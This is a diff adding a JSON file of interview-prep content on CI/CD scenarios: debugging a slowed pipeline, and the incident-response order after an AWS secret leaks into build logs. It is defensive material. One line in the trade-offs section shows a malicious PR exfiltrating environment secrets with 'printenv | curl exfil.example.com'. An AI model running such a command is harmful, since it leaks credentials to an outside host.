@@ -1,0 +1,253 @@
+{
+  "topic": "CI/CD Scenario-Based",
+  "topicSlug": "scenario-based",
+  "questions": [
+    {
+      "id": "cicd-sc-001",
+      "slug": "cicd-pipeline-suddenly-slow-debug",
+      "question": "Your CI pipeline that used to take 8 minutes now takes 35 minutes. How do you debug and fix it?",
+      "title": "Pipeline Suddenly Slow: Profile, Cache, Parallelize",
+      "direct_answer": "Profile first: pipeline timing breakdown by stage (most CI tools surface this). Common culprits: (1) cache misses from a key change — look at dependency-install times jumping from 30s to 5min; (2) test bloat — new slow tests, flaky retries; (3) Docker layer cache invalidation; (4) runner resource contention. Fix in order: restore caches, parallelize tests, split slow integration tests into a separate stage, and right-size runners.",
+      "layout_type": "scenario-walkthrough",
+      "interviewer_intent": {
+        "testing": "Real-world CI debugging — systematic profiling vs guessing",
+        "common_mistake": "Throwing bigger runners at the problem before profiling — wastes money and often doesn't help (single-threaded bottlenecks)",
+        "to_stand_out": "Show the systematic profiling approach (timing breakdown → hypothesis → measure → fix), discuss test impact analysis (TIA) and the 80/20 rule for slow tests"
+      },
+      "company_tags": [
+        "circleci",
+        "github",
+        "spotify",
+        "shopify"
+      ],
+      "reading_time_minutes": 8,
+      "last_updated": "2026-04-22",
+      "difficulty": "medium",
+      "answer": {
+        "sections": [
+          {
+            "type": "overview",
+            "title": "The Diagnosis: Profile Before You Fix",
+            "content": "A pipeline that quadrupled in time has a discrete cause — something changed. The mistake teams make is jumping to fixes (\"add bigger runners,\" \"parallelize tests\") before identifying the actual bottleneck. The result: spend money on bigger runners and the pipeline is still slow because the bottleneck was a cache miss, not CPU.\n\n**Step 1 is always profiling.** Every CI tool surfaces per-stage timing: GitHub Actions has the workflow run summary, Jenkins has Pipeline Stage View, GitLab CI has the pipeline duration breakdown. Look at the timing of each stage today vs the historical baseline (when it was 8 minutes). Identify which stage(s) grew.\n\n**The four most common culprits in order of frequency:**\n1. **Dependency install jumped 30s → 5min** — cache key changed (lockfile changed, cache action version bumped, runner image changed); cache is now missing and downloading from scratch every run\n2. **Tests went from 4min → 20min** — someone added integration tests without parallelism, or a flaky test is retrying 3x\n3. **Docker build went from 2min → 10min** — Dockerfile change invalidated layer cache early in the build; subsequent layers all rebuild\n4. **Runner queue time jumped** — hosted runner pool exhausted, jobs waiting for a runner before starting\n\nMost slowdowns trace to one of these four. Profile first, then fix the one that's actually broken."
+          },
+          {
+            "type": "architecture_diagram",
+            "title": "Diagnostic Flow for a Slow Pipeline",
+            "content": "```mermaid\nflowchart TB\n    Start[Pipeline now 35min<br/>was 8min] --> Profile[Open run summary<br/>look at per-stage timing]\n    Profile --> Compare[Compare to a recent fast run<br/>which stages grew?]\n    Compare --> Q1{Cache stage<br/>now slow?}\n    Q1 -->|yes| C1[Check cache key<br/>look for misses]\n    C1 --> F1[Fix cache key<br/>or restore cache action]\n    Q1 -->|no| Q2{Test stage<br/>grew?}\n    Q2 -->|yes| C2[Look at test timing<br/>flaky retries? new slow tests?]\n    C2 --> F2[Parallelize, split,<br/>quarantine flakies]\n    Q2 -->|no| Q3{Docker build<br/>grew?}\n    Q3 -->|yes| C3[Check Dockerfile changes<br/>cache invalidation point]\n    C3 --> F3[Reorder layers<br/>multi-stage build]\n    Q3 -->|no| Q4{Queue time<br/>high?}\n    Q4 -->|yes| F4[Add runners or<br/>switch to self-hosted]\n    F1 --> Verify[Re-run pipeline<br/>verify timing]\n    F2 --> Verify\n    F3 --> Verify\n    F4 --> Verify\n    style Profile fill:#fff9c4\n    style Verify fill:#c8e6c9\n```\n\nProfile, hypothesize, fix, verify. Don't skip the profile step — it's the difference between fixing the actual problem and burning money on bigger runners."
+          },
+          {
+            "type": "step",
+            "title": "The Five Most Common Slowdowns and How to Fix Them",
+            "content": "**Slowdown 1 — Cache miss on dependencies.** Dependency install went from 30s to 5min.\n\n*Diagnose*: Open the cache step's logs. Look for `Cache not found` or `Cache miss`. Check if the cache key changed recently — most cache keys hash a lockfile (`package-lock.json`, `pom.xml`, `requirements.txt`); a lockfile change invalidates the cache entirely.\n\n*Fix*: Use a fallback (restore-keys in GitHub Actions) so a partial cache hit beats nothing. Stabilize cache keys — hash only files that actually drive dependencies. For Maven/Gradle, cache `~/.m2` or `~/.gradle/caches`; for Node, cache `~/.npm` not `node_modules` (npm ci downloads from cache faster than untar).\n\n```yaml\n- uses: actions/cache@v4\n  with:\n    path: ~/.m2\n    key: maven-${{ hashFiles('**/pom.xml') }}\n    restore-keys: |\n      maven-\n```\n\n**Slowdown 2 — Test bloat or flaky retries.** Tests went from 4min to 20min.\n\n*Diagnose*: Use test reporting (JUnit XML, GitHub Actions test reporter) to surface slowest tests. Look at retry counts — a flaky test retried 3 times is 3x cost. Use test impact analysis (TIA) tools like Test Impact Analyzer or in-house tooling to run only tests affected by code changes.\n\n*Fix*: (a) Quarantine flakes — move them to a separate non-blocking job until fixed; (b) Parallelize — most test runners support `--parallel N` or sharding; (c) Split slow integration tests into a separate stage that runs only on main or on labeled PRs; (d) Apply the 80/20 rule — 5% of tests typically take 50% of time; profile and fix or move them.\n\n**Slowdown 3 — Docker layer cache invalidated.** Build went from 2min to 10min.\n\n*Diagnose*: Look at the Docker build log. Find the first layer that says `not cached` — everything after rebuilds. Most common cause: copying source files before installing dependencies (`COPY . .` then `npm install` rebuilds dependencies on any source change).\n\n*Fix*: Reorder Dockerfile to put dependency installation early and rare-changing operations before frequent ones:\n\n```dockerfile\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n```\n\nUse multi-stage builds; use BuildKit cache mounts (`RUN --mount=type=cache,target=/root/.m2 mvn package`); use registry cache exporter for cross-pipeline cache.\n\n**Slowdown 4 — Runner queue time.** Jobs wait 5+ minutes before starting.\n\n*Diagnose*: Check the timestamp on `Queued` vs `Started`. If queue time is significant, runner pool is exhausted.\n\n*Fix*: Add concurrent runners (paid tiers raise limits); switch to self-hosted runners on autoscaling K8s or EC2 spot; reduce concurrent pipeline triggers (path filters so docs changes don't trigger full builds).\n\n**Slowdown 5 — Runner resource contention.** Build runs but each step is slow.\n\n*Diagnose*: SSH into self-hosted runner during a build; run `top`, `iostat`, check disk IO; might be running multiple jobs on undersized runner.\n\n*Fix*: Right-size runners; isolate heavy jobs (database tests, integration suites) to dedicated larger runners; use SSD-backed disks; enable BuildKit on Docker for parallel layer builds."
+          },
+          {
+            "type": "tradeoffs",
+            "title": "Trade-offs and Subtle Pitfalls",
+            "content": "**Bigger runners aren't always faster.** Many CI workloads are single-threaded (e.g., a sequential test suite). Doubling CPU does nothing. Profile before scaling vertically.\n\n**Test parallelism has overhead.** Spinning up 8 parallel test workers each with their own database fixture costs 30s of setup per worker. If tests only take 2 minutes, parallelism may not help. Sweet spot is usually 2–4 parallel workers.\n\n**Cache eviction.** GitHub Actions cache evicts at 10GB per repo; older entries get dropped. A team that caches everything ends up evicting frequently-used caches. Cache strategically.\n\n**Test impact analysis (TIA).** Running only tests affected by a code change is huge for monorepos but requires tooling. Microsoft's Test Impact Analysis, Bazel's incremental builds, and Nx all enable this. Don't reach for TIA until standard parallelism and caching are exhausted.\n\n**Flaky tests destroy velocity.** A 1% flaky test rate at 100 tests = 63% chance of failure per run. Flakes that retry consume runner time and erode trust. Quarantine immediately, fix or delete within a week.\n\n**The cost-vs-time trade-off.** Running matrix builds (3 OS × 4 versions = 12 jobs) gives broad coverage but costs 12x. Limit matrix to PR runs of trunk; full matrix only on nightly.\n\n**CI as a feedback loop.** A 35-minute pipeline kills velocity — developers context-switch, batch changes, lose the build-test-fix tight loop. The target should be PR feedback under 10 minutes, with full deployment under 30. Anything over an hour signals a CI architecture problem, not just a tuning problem."
+          },
+          {
+            "type": "key_points",
+            "title": "Key Points",
+            "content": "- **Profile before fixing** — every CI tool shows per-stage timing; compare to baseline; identify which stage grew\n- **Top causes**: cache miss (lockfile change), test bloat (flaky retries, slow tests), Docker layer invalidation, runner queue time, resource contention\n- **Cache strategy**: stable keys with restore-keys fallback; cache the right artifacts (`~/.m2`, `~/.npm`, not target/node_modules); layer Dockerfile from least to most changing\n- **Test optimization**: quarantine flakes immediately; parallelize 2–4 workers; split slow integration tests to separate stage; consider test impact analysis for monorepos\n- **Don't just throw bigger runners**: many workloads are single-threaded; parallelism has setup overhead; right-size based on profile\n- **PR feedback under 10 minutes** is the target; longer pipelines kill the build-test-fix tight loop and developer velocity"
+          },
+          {
+            "type": "speakable_answer",
+            "title": "How to Answer This Verbally",
+            "content": "Pipeline went from 8 minutes to 35 minutes. The temptation is to throw bigger runners at it, but the right first step is always profiling — every CI tool surfaces per-stage timing, and the answer is usually one specific stage that grew, not the whole pipeline degrading uniformly.\n\n**Step 1 — profile**\n- Open the run summary; compare per-stage timing today vs a recent fast run\n- Identify which stage grew — dependency install, test stage, Docker build, or queue wait\n- This narrows the search from \"the whole pipeline is slow\" to one specific bottleneck\n\n**The four most common culprits, in order of frequency**\n\n*Cache miss on dependencies*\n- Symptom: dependency install jumped from 30 seconds to 5 minutes\n- Diagnose: cache step logs say \"cache not found\"; the cache key probably hashes a lockfile that changed\n- Fix: add restore-keys for fallback (partial hit beats nothing); cache the right artifacts — npm cache directory, Maven .m2, Gradle caches, not the build output\n\n*Test bloat or flaky retries*\n- Symptom: tests went from 4 minutes to 20 minutes\n- Diagnose: surface slowest tests via JUnit reports; check retry counts — a flaky test retried 3 times costs 3x\n- Fix: quarantine flakes immediately into a non-blocking job; parallelize with 2–4 workers; split slow integration tests into a separate stage that runs only on main or labeled PRs; the 80/20 rule applies — 5% of tests usually take 50% of the time\n\n*Docker layer cache invalidated*\n- Symptom: Docker build went from 2 to 10 minutes\n- Diagnose: build log shows the first \"not cached\" layer; everything after rebuilds; most common cause is copying source before installing dependencies\n- Fix: reorder the Dockerfile so dependency files are copied and installed before source; use multi-stage builds; use BuildKit cache mounts for Maven or npm caches; use registry cache exporter for cross-pipeline cache\n\n*Runner queue time*\n- Symptom: jobs wait 5+ minutes before starting\n- Diagnose: gap between queued and started timestamps\n- Fix: add concurrent runner capacity; switch to self-hosted runners on autoscaling Kubernetes or EC2 spot; add path filters so unrelated changes (docs) don't trigger full builds\n\n**The traps to avoid**\n- Bigger runners aren't always faster — many workloads are single-threaded; doubling CPU does nothing\n- Test parallelism has overhead — spinning up 8 workers each with database fixtures costs 30 seconds per worker; sweet spot is usually 2–4\n- Cache eviction — GitHub Actions evicts at 10GB per repo; if you cache everything, frequently-used caches get evicted\n- Flaky tests destroy velocity — a 1% flaky rate across 100 tests means 63% chance of failure per run; quarantine and fix or delete within a week\n\n**The bigger picture**\n- The target is PR feedback under 10 minutes and full deployment under 30; longer kills the developer build-test-fix tight loop\n- Anything over an hour signals a CI architecture problem — monolithic test suite, missing test impact analysis, no caching strategy — not just a tuning problem"
+          }
+        ]
+      },
+      "followup_questions": [
+        "What is test impact analysis (TIA) and when is it worth implementing?",
+        "How do BuildKit cache mounts speed up Docker builds in CI?",
+        "What's the right strategy for handling flaky tests in CI?",
+        "When should you switch from GitHub-hosted to self-hosted runners?"
+      ],
+      "seo": {
+        "metaTitle": "Slow CI Pipeline Debug: Profile, Cache, Parallelize | InterviewExplainer",
+        "metaDescription": "Debug a CI pipeline that suddenly became slow. Profile first; common causes (cache miss, test bloat, Docker invalidation, queue time); systematic fixes."
+      },
+      "speakable_v2": {
+        "archetype": "C",
+        "pillar": "P09",
+        "hook": "Pipeline went from 8 minutes to 35 minutes.",
+        "beats": [
+          {
+            "kind": "mental_model",
+            "layout": "paragraph",
+            "text": "A pipeline that quadrupled in time has a discrete cause — something changed. The mistake teams make is jumping to fixes (\"add bigger runners,\" \"parallelize tests\") before identifying the actual bottleneck. The result: spend money on bigger runners and the pipeline is still slow because the bottleneck was a cache miss, not CPU. Step 1 is always profiling. Every CI tool surfaces per-stage timing: GitHub Actions has the workflow run summary, Jenkins has Pipeline Stage View, GitLab CI has the pipeline duration breakdown. Look at the timing of each stage."
+          },
+          {
+            "kind": "mechanism",
+            "layout": "ordered_list",
+            "steps": [
+              "Slowdown 1 — Cache miss on dependencies.",
+              "Dependency install went from 30s to 5min.",
+              "Diagnose: Open the cache step's logs.",
+              "Look for Cache not found or Cache miss.",
+              "Check if the cache key changed recently — most cache keys hash a lockfile (package-lock.json, pom.xml, requirements.txt); a lockfile change invalidates the cache entirely.",
+              "Fix: Use a fallback (restore-keys in GitHub Actions) so a partial cache hit beats nothing."
+            ]
+          },
+          {
+            "kind": "edge_cases",
+            "layout": "bullets",
+            "items": [
+              "Profile before fixing — every CI tool shows per-stage timing; compare to baseline; identify which stage grew Top causes: cache miss (lockfile change), test bloat (flaky retries, slow tests), Docker layer invalidation, runner queue time, resource contention Cache strategy: stable keys with restore-keys fallback; cache the right artifacts (~/",
+              "npm, not target/node_modules); layer Dockerfile from least to most changing Test optimization: quarantine flakes immediately; parallelize 2–4 workers; split slow integration tests to separate stage; consider test impact analysis for monorepos Don't just throw bigger runners: many workloads are single-threaded; parallelism has setup overhead; right-size based on profile PR feedback under 10 minutes is the target; longer pipelines kill the build-test-fix tight loop and developer velocity"
+            ]
+          },
+          {
+            "kind": "failure_mode",
+            "layout": "callout",
+            "text": "Throwing bigger runners at the problem before profiling — wastes money and often doesn't help (single-threaded bottlenecks)"
+          }
+        ],
+        "cap": "Step 1 — profile Open the run summary; compare per-stage timing today vs a recent fast run Identify which stage grew — dependency install, test stage, Docker build, or queue wait This narrows the sear",
+        "familiarity_anchors": [
+          "Profile",
+          "Common",
+          "Docker"
+        ],
+        "tts_overrides": {},
+        "speakable_status": "pending_review",
+        "followup_handoff": [
+          "What is test impact analysis (TIA) and when is it worth implementing?",
+          "How do BuildKit cache mounts speed up Docker builds in CI?",
+          "What's the right strategy for handling flaky tests in CI?"
+        ],
+        "audience_assumption": "familiar",
+        "voice": "friendly",
+        "standard_example": "Spring Boot app with GitHub Actions CI/CD pipeline"
+      }
+    },
+    {
+      "id": "cicd-sc-002",
+      "slug": "cicd-secrets-leaked-in-build-logs",
+      "question": "An engineer accidentally printed an AWS secret key in a CI build log. What do you do, in order?",
+      "title": "Leaked Secret in CI Logs: Rotate, Audit, Prevent",
+      "direct_answer": "Treat as compromised immediately: (1) rotate the secret in the source-of-truth (AWS IAM, Vault, etc.) — invalidating the leaked value is more important than hiding the log; (2) audit usage — CloudTrail/GuardDuty for the leaked key, look for unauthorized API calls; (3) purge the log if possible (delete the workflow run; for GitLab, redact); (4) prevent recurrence — enable secret-masking in CI, add pre-commit secret scanners (gitleaks, trufflehog), enforce OIDC over static credentials.",
+      "layout_type": "scenario-walkthrough",
+      "interviewer_intent": {
+        "testing": "Incident-response sequencing for a real security event — priority of actions",
+        "common_mistake": "Trying to delete the log first to 'hide' the leak — the secret is already cached/scraped/indexed; rotation is the only fix",
+        "to_stand_out": "Discuss assume-compromised, the limits of log redaction (cached views, downstream systems), OIDC as the structural fix, and post-incident review with timeline"
+      },
+      "company_tags": [
+        "aws",
+        "github",
+        "hashicorp",
+        "cloudflare"
+      ],
+      "reading_time_minutes": 8,
+      "last_updated": "2026-04-22",
+      "difficulty": "hard",
+      "answer": {
+        "sections": [
+          {
+            "type": "overview",
+            "title": "Assume Compromised, Then Act in Order",
+            "content": "A secret in a build log must be treated as compromised the moment you see it — you can't know who else has seen it, whether it's been scraped by a bot, cached by a reverse proxy, or indexed by a third-party logging integration. The instinct to \"delete the log first\" is wrong; the secret is already out, and rotating it is the only action that actually mitigates the risk.\n\n**The correct priority order:**\n1. **Rotate immediately** — invalidate the leaked credential at its source (AWS IAM, Vault, GitHub secrets, etc.) before doing anything else\n2. **Audit usage** — check CloudTrail (AWS), Audit Logs (GCP), Activity Log (Azure), GitHub Audit Log to see if the leaked credential was used by an unauthorized actor\n3. **Contain blast radius** — if the credential had broad permissions, review what it could access; consider breaking-glass procedures (revoking IAM roles, disabling integrations)\n4. **Purge logs where possible** — delete the workflow run, redact in tools that support it, but understand the limits\n5. **Post-incident review** — timeline, what enabled the leak, structural fixes (OIDC, secret-masking, pre-commit scanners)\n\nGetting the order wrong — e.g., spending 20 minutes trying to redact logs before rotating — means an attacker has 20 extra minutes to use the credential."
+          },
+          {
+            "type": "architecture_diagram",
+            "title": "Incident Response Flow for Leaked Secret",
+            "content": "```mermaid\nflowchart TB\n    Detect[Secret found in CI log] --> P1[1. ROTATE<br/>invalidate at source]\n    P1 --> P1Ex[AWS: deactivate access key<br/>Vault: revoke lease<br/>GH: regenerate token]\n    P1Ex --> P2[2. AUDIT usage]\n    P2 --> P2Ex[CloudTrail: who called what?<br/>GuardDuty findings?<br/>Unusual locations?]\n    P2Ex --> Q{Unauthorized<br/>activity?}\n    Q -->|yes| Esc[Escalate to security<br/>incident response]\n    Q -->|no| P3[3. CONTAIN<br/>review IAM perms]\n    P3 --> P4[4. PURGE log<br/>delete workflow run]\n    P4 --> P4Note[Limited fix:<br/>downstream logs, caches, scrapers<br/>may have copies]\n    P4Note --> P5[5. POST-INCIDENT<br/>review + structural fixes]\n    P5 --> Fix[OIDC migration<br/>secret masking<br/>pre-commit gitleaks<br/>policy-as-code]\n    style P1 fill:#ff8a80\n    style P2 fill:#ffe0b2\n    style P5 fill:#c8e6c9\n```\n\nThe red box (rotate) must come first; everything else follows."
+          },
+          {
+            "type": "step",
+            "title": "The Detailed Response Sequence",
+            "content": "**Step 1 — Rotate (within 5 minutes of detection).**\n\nFor the most common cases:\n\n```bash\n# AWS access key\naws iam update-access-key --access-key-id AKIA... --status Inactive --user-name <user>\naws iam create-access-key --user-name <user>\n\n# GitHub PAT\n# UI: settings → developer settings → personal access tokens → delete\n# Or: gh api -X DELETE /user/tokens/<id>\n\n# HashiCorp Vault token\nvault token revoke <token>\n\n# GitHub Actions OIDC role (if static credentials existed alongside)\n# Update IAM trust policy to remove static; OIDC continues working\n```\n\nDeactivate before deleting — deactivation is reversible if you discover the key was used legitimately by an internal system you didn't know about. Once confirmed safe, delete.\n\n**Step 2 — Audit usage (within 30 minutes).**\n\n```bash\n# AWS CloudTrail — query for use of the leaked key\naws cloudtrail lookup-events \\\n  --lookup-attributes AttributeKey=AccessKeyId,AttributeValue=AKIA... \\\n  --start-time 2026-04-21T00:00:00Z\n\n# GuardDuty findings (anomalous API usage)\naws guardduty list-findings --detector-id <id>\n```\n\nLook for: API calls from unfamiliar IPs (especially Tor exit nodes, well-known scraping infrastructure); calls from unexpected regions; large data egress (GetObject, ListBuckets); IAM modifications (creating new keys, escalating permissions — a classic post-compromise pattern).\n\n**Step 3 — Contain blast radius.**\n\nReview the IAM policy attached to the leaked credential. If it had `*:*` (admin) — escalate immediately to your security team; the blast radius is the whole account. If scoped to one bucket or one service, the blast radius is limited but you still need to verify nothing was modified.\n\nFor scoped credentials, check for: object modifications in S3 (versioning + delete markers reveal tampering); Lambda function code changes; new IAM roles created by the compromised principal.\n\n**Step 4 — Purge logs (after rotation, not before).**\n\nGitHub Actions: delete the workflow run via the UI or `gh run delete <run-id>`. This removes the run from the UI and API.\n\nGitLab CI: cannot delete a job log directly; can erase the job (`Erase job logs and artifacts` button) which removes logs and artifacts.\n\nJenkins: delete the build via UI or `curl -X POST <jenkins>/job/<job>/<n>/doDelete`.\n\n**Be honest about the limits.** Log deletion in the CI tool removes the *visible* log but does not remove copies that may exist in: log forwarding integrations (Datadog, Splunk, New Relic); Slack notifications that posted the log; archived audit logs; cached views (browser caches, internal proxies); third-party scrapers that watched the workflow. The leaked secret is still leaked; deletion is housekeeping, not mitigation. Rotation is mitigation.\n\n**Step 5 — Post-incident review (within 1 week).**\n\nWrite a blameless postmortem with:\n- Timeline (when leaked, when detected, when rotated, gap between)\n- Root cause (what code printed the secret? was it intentional debug output?)\n- Contributing factors (no secret masking? no OIDC? no pre-commit scanner?)\n- Action items with owners and dates\n\nStructural fixes:\n- **Migrate to OIDC** — GitHub Actions → AWS via OIDC eliminates long-lived secrets entirely; tokens are short-lived and request-scoped\n- **Enable secret masking** — GitHub Actions auto-masks values stored as `secrets.*`; ensure all credentials use this path; for GitLab, mark variables as masked\n- **Add pre-commit secret scanners** — `gitleaks`, `trufflehog`, GitHub Push Protection block secrets at commit time; make these required CI checks\n- **Policy-as-code** — OPA or Conftest rules that fail builds if scripts contain echo of credentials\n- **Least-privilege IAM** — the leaked credential should have minimal scope; review and tighten"
+          },
+          {
+            "type": "tradeoffs",
+            "title": "Hard Trade-offs and Common Mistakes",
+            "content": "**\"Don't tell anyone\" is the wrong impulse.** Engineers who leak secrets are tempted to silently rotate and hope nobody notices. The right culture is blameless reporting — the leaker who immediately tells security gets thanks; the cover-up creates legal and trust issues if discovered later.\n\n**Rotation is sometimes blocked by external dependencies.** A leaked database password used by 30 services means rotating breaks all 30. Mitigation: have a runbook for staged rotation — add new credential alongside, migrate services one at a time, then revoke old. But for the duration of staged rotation, the old credential remains valid; weigh this against the leak severity.\n\n**Log redaction is a comfort measure, not a security control.** Treating log deletion as the fix gives a false sense of security. The discipline is: rotation is the security control; deletion is hygiene.\n\n**OIDC adoption is the structural answer.** Long-lived secrets in CI are inherently risky — they leak in logs, sit in repo configs, sprawl across systems. OIDC federation (GitHub Actions → AWS IAM, Workload Identity Federation for GCP, federated identity for Azure) issues short-lived tokens per workflow run, scoped via repo and branch claims. No long-lived secrets to leak. Migration is non-trivial (IAM trust policies, role assumptions, action updates) but every team should be on this path.\n\n**Secret-scanning at multiple layers.** Defense in depth: pre-commit (gitleaks installed locally), pre-push (git hook), CI (gitleaks as a required check), and platform (GitHub Push Protection on the org). Each layer catches what the previous missed; relying on only one is fragile.\n\n**The CI runner blast radius.** Self-hosted runners that hold long-lived credentials in environment variables are a juicy target. A malicious PR that runs arbitrary code on a self-hosted runner can `printenv | curl exfil.example.com` in one line. Mitigations: ephemeral runners; restrict fork PR triggering; isolate runners by sensitivity level."
+          },
+          {
+            "type": "key_points",
+            "title": "Key Points",
+            "content": "- **Rotate first, always** — leaked credential is compromised the moment it appears in a log; rotation invalidates it; everything else follows\n- **Audit usage with CloudTrail / GuardDuty** — check if the leaked credential was used by unauthorized actors; look for IAM modifications, unusual regions, data egress\n- **Log deletion is housekeeping, not mitigation** — downstream log forwarders, Slack, scrapers may already have copies; rotation is the only real fix\n- **Migrate to OIDC** — eliminates long-lived secrets entirely; short-lived tokens scoped per workflow run; structural prevention beyond any masking\n- **Defense in depth on secret scanning** — pre-commit (gitleaks), CI checks, platform-level (GitHub Push Protection); each layer catches what others miss\n- **Blameless postmortem** — the engineer who reports the leak gets thanks; cover-ups create worse problems; postmortem produces structural action items"
+          },
+          {
+            "type": "speakable_answer",
+            "title": "How to Answer This Verbally",
+            "content": "A secret in a build log is compromised the moment it appears — you can't know who's seen it, whether a bot scraped it, or whether a third-party logging integration cached it. The instinct to delete the log first is wrong; the secret is already out, and rotation is the only action that actually mitigates risk.\n\n**The correct priority order**\n\n*Step 1 — rotate within 5 minutes*\n- For AWS: deactivate the access key with `aws iam update-access-key --status Inactive`, then create a new one\n- For GitHub PATs, Vault tokens, etc.: revoke and reissue\n- Deactivate before deleting — deactivation is reversible if you discover an internal system was using the key legitimately\n\n*Step 2 — audit usage within 30 minutes*\n- Query CloudTrail for the leaked key ID; look at every API call made with it\n- Check GuardDuty findings for anomalous behavior\n- Watch for telltales of abuse: calls from unfamiliar IPs, calls from unexpected regions, large data egress, IAM modifications creating new keys (a classic post-compromise pattern)\n\n*Step 3 — contain blast radius*\n- Review the IAM policy attached to the leaked credential\n- If admin (`*:*`), escalate to security — the blast radius is the whole account\n- If scoped, verify nothing in that scope was modified\n\n*Step 4 — purge logs (after rotation, not before)*\n- Delete the workflow run in GitHub Actions, erase the job in GitLab CI, delete the build in Jenkins\n- Be honest about limits: downstream log forwarders, Slack notifications, third-party scrapers may already have copies; deletion is housekeeping, not mitigation\n\n*Step 5 — blameless postmortem within a week*\n- Timeline, root cause, contributing factors, action items with owners\n- Structural fixes: migrate to OIDC, enable secret masking, add pre-commit gitleaks, tighten IAM policies\n\n**The structural answer is OIDC**\n- Long-lived secrets in CI are inherently risky — they leak in logs, sit in repo configs, sprawl across systems\n- OIDC federation issues short-lived tokens per workflow run, scoped via repo and branch claims; no long-lived credentials to leak\n- GitHub Actions to AWS via OIDC, GCP Workload Identity Federation, Azure federated identity — every team should be on this migration path\n\n**Defense in depth on secret scanning**\n- Pre-commit hooks with gitleaks locally; pre-push hooks; CI as a required check; platform-level GitHub Push Protection on the org\n- Each layer catches what others miss; relying on one is fragile\n\n**Cultural piece**\n- Blameless reporting — the engineer who immediately tells security gets thanks; cover-ups create legal and trust issues if discovered later\n- The discipline: rotation is the security control; deletion is hygiene; postmortem produces the structural fix that prevents the next leak"
+          }
+        ]
+      },
+      "followup_questions": [
+        "How does GitHub Actions OIDC federation to AWS work, end-to-end?",
+        "What's the difference between secret masking and secret scanning?",
+        "What is GitHub Push Protection and how does it differ from gitleaks?",
+        "How do you safely rotate a database password used by 30 services?"
+      ],
+      "seo": {
+        "metaTitle": "Leaked Secret in CI Logs: Incident Response Sequence | InterviewExplainer",
+        "metaDescription": "Step-by-step incident response for a secret leaked in CI build logs: rotate first, audit, contain, purge, postmortem. OIDC as the structural fix."
+      },
+      "speakable_v2": {
+        "archetype": "A",
+        "pillar": "P09",
+        "hook": "A secret in a build log is compromised the moment it appears — you can't know who's seen it, whether a bot scraped it, or whether a third-party logging integration cached it.",
+        "beats": [
+          {
+            "kind": "definition",
+            "layout": "paragraph",
+            "text": "A secret in a build log must be treated as compromised the moment you see it — you can't know who else has seen it, whether it's been scraped by a bot, cached by a reverse proxy, or indexed by a third-party logging integration. The instinct to \"delete the log first\" is wrong; the secret is already out, and rotating it is the only action that actually mitigates the risk. The correct priority order: 1. Rotate immediately — invalidate the."
+          },
+          {
+            "kind": "why_exists",
+            "layout": "paragraph",
+            "text": "Incident-response sequencing for a real security event — priority of actions"
+          },
+          {
+            "kind": "parts_or_states",
+            "layout": "bullets",
+            "items": [
+              "Rotate first, always — leaked credential is compromised the moment it appears in a log",
+              "rotation invalidates it",
+              "everything else follows Audit usage with CloudTrail / GuardDuty — check if the leaked credential was used by unauthorized actors",
+              "look for IAM modifications, unusual regions, data egress Log deletion is housekeeping, not mitigation — downstream log forwarders, Slack, scrapers may already have copies",
+              "rotation is the only real fix Migrate to OIDC — eliminates long-lived secrets entirely",
+              "short-lived tokens scoped per workflow run",
+              "structural prevention beyond any masking Defense in depth on secret scanning — pre-commit (gitleaks), CI checks, platform-level (GitHub Push Protection)",
+              "each layer catches what others miss Blameless postmortem — the engineer who reports the leak gets thanks",
+              "cover-ups create worse problems",
+              "postmortem produces structural action items"
+            ]
+          },
+          {
+            "kind": "example",
+            "layout": "paragraph",
+            "text": "A secret in a build log must be treated as compromised the moment you see it — you can't know who else has seen it, whether it's been scraped by a bot, cached by a reverse proxy, or indexed by a third-party logging integration. The instinct to \"delete the log first\" is wrong; the secret is already out, and rotating it is the only action that actually mitigates the risk. The correct priority order: 1. Rotate immediately — invalidate the leaked credential at its source (AWS IAM, Vault, GitHub secrets, etc.) before doing anything else 2. Audit usage — check CloudTrail (AWS), Audit Logs (GCP), Activity Log (Azure), GitHub Audit Log to see if the leaked credential was used by."
+          },
+          {
+            "kind": "pitfalls",
+            "layout": "bullets",
+            "items": [
+              "Trying to delete the log first to 'hide' the leak — the secret is already cached/scraped/indexed",
+              "rotation is the only fix"
+            ]
+          }
+        ],
+        "cap": "The correct priority order Step 1 — rotate within 5 minutes For AWS: deactivate the access key with aws iam update-access-key --status Inactive, then create a new one For GitHub PATs, Vault tokens, et",
+        "familiarity_anchors": [
+          "Treat",
+          "Vault",
+          "CloudTrail"
+        ],
+        "tts_overrides": {},
+        "speakable_status": "pending_review",
+        "followup_handoff": [
+          "How does GitHub Actions OIDC federation to AWS work, end-to-end?",
+          "What's the difference between secret masking and secret scanning?",
+          "What is GitHub Push Protection and how does it differ from gitleaks?"
+        ],
+        "audience_assumption": "familiar",
+        "voice": "friendly",
+        "standard_example": "Spring Boot app with GitHub Actions CI/CD pipeline"
+      }
+    }
+  ]
+}
